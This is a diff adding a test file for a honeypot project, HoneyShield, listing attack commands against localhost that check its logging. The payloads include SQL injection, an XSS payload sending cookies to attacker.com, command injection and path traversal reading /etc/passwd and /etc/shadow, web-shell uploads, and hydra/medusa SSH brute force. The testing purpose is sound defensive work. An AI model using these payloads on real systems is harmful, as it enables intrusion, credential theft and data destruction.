@@ -1,0 +1,238 @@
+# ======================================================================
+#                    HONEYSHIELD HONEYPOT TEST ATTACKS
+# ======================================================================
+
+This file contains various attacks you can use to test your HoneyShield honeypot.
+These commands will help you verify that your honeypot is correctly capturing 
+and logging different types of attacks.
+
+# ======================================================================
+#                           HTTP ATTACKS
+# ======================================================================
+
+## 1. Basic Path Probing
+--------------------------------------------------------------------------------
+# Test basic paths to see if they're logged
+curl -X GET http://localhost:8081/
+curl -X GET http://localhost:8081/index.php
+curl -X GET http://localhost:8081/robots.txt
+curl -X GET http://localhost:8081/sitemap.xml
+
+
+## 2. Admin Panel Attacks
+--------------------------------------------------------------------------------
+# Admin panel discovery attempts (should trigger high severity alerts)
+curl -X GET http://localhost:8081/admin
+curl -X GET http://localhost:8081/administrator
+curl -X GET http://localhost:8081/wp-admin
+curl -X GET http://localhost:8081/admin.php
+curl -X GET http://localhost:8081/phpmyadmin
+curl -X GET http://localhost:8081/dashboard
+
+
+## 3. Login Attempts
+--------------------------------------------------------------------------------
+# Login attempts with POST data (should trigger high severity alerts)
+curl -X POST -d "username=admin&password=admin123" http://localhost:8081/login
+curl -X POST -d "user=root&pass=toor" http://localhost:8081/auth
+curl -X POST -d "log=admin&pwd=password" http://localhost:8081/wp-login.php
+
+
+## 4. SQL Injection Attacks
+--------------------------------------------------------------------------------
+# Basic SQL injection attempts (should trigger critical severity alerts)
+curl -X GET "http://localhost:8081/users?id=1%20OR%201=1"
+curl -X GET "http://localhost:8081/products?category=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
+curl -X GET "http://localhost:8081/search?q=test%27%3B%20DROP%20TABLE%20users%3B--"
+curl -X POST -d "username=admin'--&password=anything" http://localhost:8081/login
+
+
+## 5. XSS (Cross-Site Scripting) Attacks
+--------------------------------------------------------------------------------
+# XSS attack attempts (should trigger high severity alerts)
+curl -X GET "http://localhost:8081/search?q=<script>alert(1)</script>"
+curl -X GET "http://localhost:8081/page?id=<img%20src=x%20onerror=alert('XSS')>"
+curl -X POST -d "comment=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>" http://localhost:8081/comments
+
+
+## 6. Command Injection Attacks
+--------------------------------------------------------------------------------
+# Command injection attempts (should trigger critical severity alerts)
+curl -X GET "http://localhost:8081/ping?host=localhost%3B%20cat%20/etc/passwd"
+curl -X GET "http://localhost:8081/exec?cmd=ls%20-la"
+curl -X POST -d "ip=127.0.0.1 | cat /etc/shadow" http://localhost:8081/tools/ping
+
+
+## 7. Path Traversal Attacks
+--------------------------------------------------------------------------------
+# Path traversal attempts (should trigger high severity alerts)
+curl -X GET "http://localhost:8081/download?file=../../../etc/passwd"
+curl -X GET "http://localhost:8081/images/..%2f..%2f..%2f..%2fetc%2fpasswd"
+curl -X GET "http://localhost:8081/include?page=../../../../etc/hosts"
+
+
+## 8. File Upload Attacks
+--------------------------------------------------------------------------------
+# File upload attempts (should trigger high severity alerts)
+curl -X POST -F "file=@/path/to/malicious.php" http://localhost:8081/upload
+curl -X POST -F "avatar=@/path/to/shell.php;type=image/jpeg" http://localhost:8081/profile/upload
+
+
+## 9. API Attacks
+--------------------------------------------------------------------------------
+# API endpoint probing and attacks (should trigger medium to high severity alerts)
+curl -X GET http://localhost:8081/api/users
+curl -X GET http://localhost:8081/api/v1/admin/users
+curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"password123"}' http://localhost:8081/api/login
+curl -X PUT -H "Content-Type: application/json" -d '{"email":"hacked@evil.com"}' http://localhost:8081/api/users/1
+curl -X DELETE http://localhost:8081/api/users/1
+
+
+## 10. Vulnerability Scanning
+--------------------------------------------------------------------------------
+# Common vulnerability paths (should trigger medium to high severity alerts)
+curl -X GET http://localhost:8081/.env
+curl -X GET http://localhost:8081/config.php
+curl -X GET http://localhost:8081/backup.sql
+curl -X GET http://localhost:8081/.git/HEAD
+curl -X GET http://localhost:8081/wp-config.php
+
+
+# ======================================================================
+#                           SSH ATTACKS
+# ======================================================================
+
+## 1. Basic SSH Login Attempts
+--------------------------------------------------------------------------------
+# Basic SSH login attempts with common credentials (should trigger high severity alerts)
+ssh -p 2222 root@localhost
+ssh -p 2222 admin@localhost
+ssh -p 2222 user@localhost
+
+
+## 2. SSH Password Brute Force
+--------------------------------------------------------------------------------
+# Using sshpass for automated password attempts (should trigger high severity alerts)
+sshpass -p "password" ssh -p 2222 root@localhost
+sshpass -p "admin" ssh -p 2222 admin@localhost
+sshpass -p "123456" ssh -p 2222 user@localhost
+
+
+## 3. SSH with Different Usernames
+--------------------------------------------------------------------------------
+# Try various common usernames (should trigger high severity alerts)
+ssh -p 2222 administrator@localhost
+ssh -p 2222 guest@localhost
+ssh -p 2222 oracle@localhost
+ssh -p 2222 test@localhost
+ssh -p 2222 ubuntu@localhost
+ssh -p 2222 pi@localhost
+
+
+# ======================================================================
+#                        ADVANCED TESTING
+# ======================================================================
+
+## 1. Automated HTTP Fuzzing
+--------------------------------------------------------------------------------
+# Using ffuf for fuzzing (install with: apt install ffuf)
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:8081/FUZZ
+
+# Using wfuzz (install with: apt install wfuzz)
+wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://localhost:8081/FUZZ
+
+
+## 2. Automated SSH Brute Force
+--------------------------------------------------------------------------------
+# Using hydra for SSH brute force (install with: apt install hydra)
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222
+
+# Using medusa (install with: apt install medusa)
+medusa -h localhost -u root -P /usr/share/wordlists/rockyou.txt -M ssh -n 2222
+
+
+## 3. Nmap Scanning
+--------------------------------------------------------------------------------
+# Basic port scan
+nmap -p 2222,5001,8081 localhost
+
+# Service detection
+nmap -sV -p 2222,5001,8081 localhost
+
+# Vulnerability scanning
+nmap --script vuln -p 2222,5001,8081 localhost
+
+
+# ======================================================================
+#                        ANALYZING RESULTS
+# ======================================================================
+
+After running these attacks, you can check the honeypot's logs and database to verify 
+that the attacks were captured:
+
+## 1. Check the log file
+--------------------------------------------------------------------------------
+tail -n 50 honeyshield.log
+
+
+## 2. Query the database for recent events
+--------------------------------------------------------------------------------
+source venv/bin/activate && python -c "
+import sqlite3
+conn = sqlite3.connect('honeyshield/honeyshield.db')
+cursor = conn.cursor()
+cursor.execute('SELECT timestamp, event_type, source_ip, severity, details FROM events ORDER BY timestamp DESC LIMIT 20')
+print('Recent Events:')
+print('-' * 80)
+[print(f'{row[0]} | {row[1]} | {row[2]} | {row[3]}') for row in cursor.fetchall()]
+conn.close()
+"
+
+
+## 3. Count events by type
+--------------------------------------------------------------------------------
+source venv/bin/activate && python -c "
+import sqlite3
+conn = sqlite3.connect('honeyshield/honeyshield.db')
+cursor = conn.cursor()
+cursor.execute('SELECT event_type, COUNT(*) FROM events GROUP BY event_type')
+print('Event Counts:')
+print('-' * 80)
+[print(f'{row[0]}: {row[1]}') for row in cursor.fetchall()]
+conn.close()
+"
+
+
+## 4. Count events by severity
+--------------------------------------------------------------------------------
+source venv/bin/activate && python -c "
+import sqlite3
+conn = sqlite3.connect('honeyshield/honeyshield.db')
+cursor = conn.cursor()
+cursor.execute('SELECT severity, COUNT(*) FROM events GROUP BY severity')
+print('Severity Counts:')
+print('-' * 80)
+[print(f'{row[0]}: {row[1]}') for row in cursor.fetchall()]
+conn.close()
+"
+
+
+# ======================================================================
+#                              NOTES
+# ======================================================================
+
+1. These attacks are for testing purposes only. Do not use these commands against 
+   systems you don't own or have permission to test.
+
+2. Some commands may require additional tools to be installed on your system.
+
+3. The honeypot should be running before executing these commands.
+
+4. You may need to modify the IP address and port numbers if your honeypot is 
+   running on a different host or ports.
+
+5. For more realistic testing, consider running these commands from a different 
+   machine to simulate external attacks.
+
+keygen fix cmd
+ssh-keygen -R [localhost]:2222
